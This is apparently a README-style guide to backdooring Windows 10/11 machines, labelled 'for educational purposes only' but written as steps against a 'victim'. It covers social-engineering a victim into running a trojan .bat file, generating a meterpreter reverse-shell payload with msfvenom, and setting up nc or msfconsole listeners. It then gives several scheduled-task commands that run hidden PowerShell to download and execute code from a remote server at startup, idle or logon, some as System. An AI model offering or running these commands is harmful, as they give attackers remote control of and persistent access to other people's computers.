# Windows 11/10 Bypass AV & Backdoor
##### For educational purposes only!
##### Social Engineering required!
## Steps to Compromise:

1. Make it convincing by turning it into a trojan horse.
2. Get victim to download .bat file to their machine (i.e through ngrok server, google drive, discord, or other means.)
3. Generate the payload: <br>
Using meterpreter here, but feel free to play around with it. <br>
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[YOUR_IP] LPORT=4444 -a x86 -f exe -o [FILE_NAME.exe]

4. Setup your listener with nc or msfconsole: <br>
nc -lvnp 9001 <br>
or <br>
msfconsole -q <br>
msf> use multi/handler <br>
msf  exploit(handler) > set payload windows/meterpreter/reverse_tcp <br>
msf  exploit(handler) > set LHOST <Listening_IP> (for example set LHOST 192.168.5.55) <br>
msf exploit(handler) > set LPORT <Listening_Port> (for example set LPORT 4444) <br>
msf exploit(handler) > exploit <br>
5. For persistence, create a schuled task for backdoor payload: <br>
   (x64) - On System Start <br>
   schtasks /create /tn PentestLab /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX      ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'" /sc onstart /ru System <br>
 
(X64) - On User Idle (30mins) <br>
schtasks /create /tn PentestLab /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'" /sc onidle /i 30 <br>
 
(X86) - On User Login <br>
schtasks /create /tn PentestLab /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'" /sc onlogon /ru System <br>
  
(X86) - On System Start <br>
schtasks /create /tn PentestLab /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'" /sc onstart /ru System <br>
  
(X86) - On User Idle (30mins) <br>
schtasks /create /tn PentestLab /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'" /sc onidle /i 30 <br>
